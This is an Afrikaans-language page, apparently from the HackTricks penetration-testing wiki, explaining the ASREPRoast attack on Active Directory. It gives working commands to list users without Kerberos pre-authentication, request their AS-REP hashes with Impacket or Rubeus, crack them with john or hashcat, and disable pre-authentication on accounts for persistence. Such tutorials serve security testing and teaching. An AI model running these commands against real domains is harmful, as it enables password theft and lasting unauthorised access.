# ASREPRoast

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Sluit aan by die [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om te kommunikeer met ervare hackers en foutjagters!

**Hacking-insigte**\
Raak betrokke by inhoud wat die opwinding en uitdagings van hackery ondersoek

**Hack-nuus in werklikheid**\
Bly op hoogte van die vinnige hackery-wêreld deur werklikheidsnuus en insigte

**Nuutste aankondigings**\
Bly ingelig met die nuutste foutjagbounties wat begin en belangrike platformopdaterings

**Sluit aan by ons op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!

## ASREPRoast

ASREPRoast is 'n sekuriteitsaanval wat gebruikers aanval wat die **Kerberos vooraf-verifikasie vereiste kenmerk** ontbreek. Hierdie kwesbaarheid maak dit in wese vir aanvallers moontlik om verifikasie vir 'n gebruiker van die Domeinbeheerder (DC) aan te vra sonder om die gebruiker se wagwoord nodig te hê. Die DC reageer dan met 'n boodskap wat versleutel is met die gebruiker se wagwoord-afgeleide sleutel, wat aanvallers kan probeer kraak om die gebruiker se wagwoord te ontdek.

Die hoofvereistes vir hierdie aanval is:
- **Gebrek aan Kerberos vooraf-verifikasie**: Teikengebruikers moet hierdie sekuriteitskenmerk nie geaktiveer hê nie.
- **Verbinding met die Domeinbeheerder (DC)**: Aanvallers het toegang tot die DC nodig om versoek te stuur en versleutelde boodskappe te ontvang.
- **Opsionele domeinrekening**: Die besit van 'n domeinrekening maak dit vir aanvallers moontlik om kwesbare gebruikers meer doeltreffend te identifiseer deur middel van LDAP-navrae. Sonder so 'n rekening moet aanvallers gebruikersname raai.


#### Identifiseer kwesbare gebruikers (benodig domeinlegitimasie)

{% code title="Met Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% code title="Met Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
{% endcode %}

#### Versoek AS_REP-boodskap

{% code title="Met behulp van Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% code title="Met Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
AS-REP Roasting met Rubeus sal 'n 4768 genereer met 'n enkripsietipe van 0x17 en voorafgoedkeuringstipe van 0.
{% endhint %}

### Kraak
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Volharding

Dwing **preauth** nie vereis vir 'n gebruiker waar jy **GenericAll** toestemmings het (of toestemmings om eienskappe te skryf):

{% code title="Met Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% code title="Met Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## Verwysings

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Sluit aan by die [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om met ervare hackers en foutvinders te kommunikeer!

**Hacking-insigte**\
Raak betrokke by inhoud wat die opwinding en uitdagings van hacking ondersoek

**Real-Time Hack Nuus**\
Bly op hoogte van die vinnige wêreld van hacking deur middel van real-time nuus en insigte

**Nuutste aankondigings**\
Bly ingelig met die nuutste foutvindings wat bekendgestel word en kritieke platform-opdaterings

**Sluit aan by ons op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!

<details>

<summary><strong>Leer AWS hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
